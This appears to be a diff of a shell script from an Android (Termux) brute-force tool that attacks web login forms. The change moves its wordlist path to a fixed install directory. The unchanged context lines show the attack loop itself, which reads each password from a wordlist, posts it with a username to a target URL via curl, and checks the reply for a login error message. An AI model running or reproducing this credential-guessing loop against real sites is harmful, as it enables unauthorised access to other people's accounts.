@@ -20,10 +20,10 @@ echo "";
 echo "Wordlist File";
 echo -n "Default [wordlist.txt] : "; read wlist
 
-echo Total [$(wc -l < $wlist)] Wordlist
+echo Total [$(wc -l < /data/data/com.termux/files/usr/share/wfdroid/list/$wlist)] Wordlist
 
 i=0
-for passw in $(cat $wlist); do
+for passw in $(cat /data/data/com.termux/files/usr/share/wfdroid/list/$wlist); do
 	i=$[i+1]
 	brute=$(curl -i -L -s --data-urlencode  $inpusr=$username --data-urlencode $inppwd=$passw $url)
 	if [[ $brute =~ $errmsg ]];
